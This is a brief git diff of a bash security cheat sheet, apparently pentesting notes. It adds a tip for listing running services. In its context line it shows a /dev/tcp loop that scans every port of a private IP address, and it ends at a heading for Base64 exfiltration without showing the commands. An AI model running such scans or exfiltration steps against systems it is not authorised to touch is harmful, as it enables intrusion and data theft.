@@ -34,7 +34,10 @@ for i in {1..65535}; do (echo < /dev/tcp/192.168.0.1/$i) &>/dev/null && printf "
 
 ### Commom Bash
 ```bash
-# Search command history on bash
+#To find any abnormally running services, you can use
+service --status-all
+
+#Search command history on bash
 Ctrl+r
 
 #Exfiltration using Base64
